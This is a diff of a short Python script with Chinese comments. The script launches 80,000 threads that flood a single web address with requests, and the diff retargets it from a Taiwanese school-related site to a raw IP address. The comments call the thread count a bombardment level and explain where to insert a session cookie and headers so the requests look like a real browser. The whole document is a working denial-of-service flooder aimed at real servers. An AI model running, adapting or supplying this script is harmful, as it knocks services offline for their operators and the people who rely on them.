@@ -1,7 +1,7 @@
 import requests
 import threading #多線程
 header={
-    'Referer':"http://web.a3b6.com.tw/112ntpc/index.aspx", #這邊放referer
+    'Referer':"https://120.102.232.105/nss/p/index", #這邊放referer
     'Cookie':'ASP.NET_SessionId=1tv4uhz3emy4c155ldop2u55; iat=srv-T48I8cAPuNODDS9VTS0Mhw|ZUh9H', #這邊放cookie,如果沒有可以把前面的給註解起來
     'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36' #這邊放user-agent
 }
@@ -14,4 +14,4 @@ def run(url):
         except:
             pass    #沒回應就跳過
 #這邊for遍歷數字放多少可看作多少線程轟炸
-for i in range(80000):threading.Thread(target=run,args=("http://web.a3b6.com.tw/112ntpc/index.aspx",)).start()
+for i in range(80000):threading.Thread(target=run,args=("https://120.102.232.105/nss/p/index",)).start()
